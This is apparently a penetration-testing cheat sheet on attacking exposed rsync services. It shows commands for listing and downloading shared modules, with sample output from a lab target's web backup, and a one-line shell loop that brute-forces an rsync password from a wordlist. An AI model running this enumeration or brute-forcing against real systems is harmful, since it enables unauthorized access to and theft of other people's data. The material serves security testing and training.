---
title: "Rsync"
date: 2025-7-25
tags: ["Rsync", "Password Cracking", "Enumeration"]
---

### General

```console
# List root directories ('/')
rsync --list-only -av rsync://<TARGET>/
```

```console {class="sample-code"}
$ rsync --list-only -av rsync://10.10.64.45/            
httpd           web backup
```

```console
# List root directories ('/') with ipv6
rsync --list-only -av rsync://[<TARGET_IPV6>]:8730/
```

```console
# List sub-directories
rsync --list-only -av rsync://<TARGET>/<DIR>/
```

```console {class="sample-code"}
$ rsync --list-only -av rsync://10.10.64.45/httpd/
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 19:50:04 .
drwxr-xr-x          4,096 2023/04/20 20:13:22 db
-rw-r--r--         12,288 2023/04/20 19:50:42 db/site.db
drwxr-xr-x          4,096 2023/04/20 19:50:50 migrate
drwxr-xr-x          4,096 2023/04/20 20:13:15 www
-rw-r--r--          1,722 2023/04/20 20:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 20:09:10 www/index.php
-rw-r--r--            101 2023/04/20 20:03:08 www/logout.php

sent 23 bytes  received 228 bytes  100.40 bytes/sec
total size is 16,426  speedup is 65.44
```

```console
# List a file
rsync --list-only -av rsync://<TARGET>/<FILE_PATH>
```

```console {class="sample-code"}
$ rsync --list-only -av rsync://10.10.64.45/httpd/db/site.db
receiving incremental file list
-rw-r--r--         12,288 2023/04/20 19:50:42 site.db

sent 20 bytes  received 48 bytes  27.20 bytes/sec
total size is 12,288  speedup is 180.71
```

```console
# List files (wildcard)
rsync --list-only -av rsync://<TARGET>/<FILE_PATH>*
```

```console {class="sample-code"}
$ rsync --list-only -av rsync://10.10.64.45/httpd/www*      
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 20:13:15 www
-rw-r--r--          1,722 2023/04/20 20:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 20:09:10 www/index.php
-rw-r--r--            101 2023/04/20 20:03:08 www/logout.php

sent 25 bytes  received 142 bytes  66.80 bytes/sec
total size is 4,138  speedup is 24.78
```

```console
# Get a directory
rsync -av rsync://<TARGET>/<DIR>/ .
```

```console {class="sample-code"}
$ rsync -av rsync://10.10.64.45/httpd/ .
receiving incremental file list
./
db/
db/site.db
migrate/
www/
www/dashboard.php
www/index.php
www/logout.php

sent 123 bytes  received 16,850 bytes  4,849.43 bytes/sec
total size is 16,426  speedup is 0.97
```

```console
# Get a file
rsync -av rsync://<TARGET>/<FILE_PATH> .
```

```console {class="sample-code"}
$ rsync -av rsync://10.10.64.45/httpd/db/site.db .
receiving incremental file list
site.db

sent 43 bytes  received 12,383 bytes  4,970.40 bytes/sec
total size is 12,288  speedup is 0.99
```

```console
# Get files (wildcard)
rsync -a rsync://<TARGET>/<FILE_PATH>* .
```

```console {class="sample-code"}
$ rsync -av rsync://10.10.64.45/httpd/www* .      
receiving incremental file list
www/
www/dashboard.php
www/index.php
www/logout.php

sent 85 bytes  received 4,412 bytes  1,798.80 bytes/sec
total size is 4,138  speedup is 0.92
```

```console
# Copy files recusively to remote (Authenticated)
export RSYNC_PASSWORD='<PASSWORD>'; rsync -avR <SRC_DIR> rsync://<USER>@<TARGET>/<DEST_DIR>/
```

---

### Bruteforce rsync Password

```console
# Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@<TARGET>/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
```
